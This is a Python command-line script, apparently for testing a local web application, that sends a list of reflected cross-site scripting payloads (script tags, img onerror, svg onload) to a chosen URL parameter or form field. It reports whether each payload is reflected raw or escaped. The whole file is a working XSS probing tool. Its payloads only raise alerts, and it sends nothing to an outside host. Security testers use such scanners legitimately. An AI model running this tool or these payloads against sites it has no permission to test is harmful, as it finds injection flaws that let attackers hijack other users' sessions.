import argparse
import requests

DEFAULT_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]


def parse_cookies(cookie_string):
    cookies = {}

    if not cookie_string:
        return cookies

    for part in cookie_string.split(';'):
        if '=' in part:
            k, v = part.strip().split('=', 1)
            cookies[k] = v

    return cookies


def main():
    ap = argparse.ArgumentParser(description="Send XSS payloads to local target")
    ap.add_argument("--url", required=True, help="Например: http://localhost:8008/search")
    ap.add_argument("--param", required=True, help="Параметр URL или имя поля формы")
    ap.add_argument("--method", choices=["GET", "POST"], default="GET")
    ap.add_argument("--payload", default=None, help="Одна своя полезная нагрузка")
    ap.add_argument("--cookie", default=None, help="Например: session=abc; user=admin")
    ap.add_argument("--field", action="append", help="Дополнительное поле формы: name=value")
    args = ap.parse_args()

    payloads = [args.payload] if args.payload else DEFAULT_PAYLOADS
    cookies = parse_cookies(args.cookie)

    extra = {}
    if args.field:
        for item in args.field:
            if '=' in item:
                k, v = item.split('=', 1)
                extra[k] = v

    for payload in payloads:
        if args.method == "GET":
            params = extra.copy()
            params[args.param] = payload
            r = requests.get(args.url, params=params, cookies=cookies, timeout=10)
        else:
            data = extra.copy()
            data[args.param] = payload
            r = requests.post(args.url, data=data, cookies=cookies, timeout=10)

        print("=" * 80)
        print(f"Payload: {payload}")
        print(f"Request URL: {r.request.url}")

        if args.method == "POST":
            print(f"POST body: {data}")

        print(f"Status: {r.status_code}")
        print(f"Raw reflected: {payload in r.text}")
        print(f"Escaped reflected: {payload.replace('<', '&lt;').replace('>', '&gt;') in r.text}")

        print("Response body preview:")
        print(r.text[:500])


if __name__ == "__main__":
    main()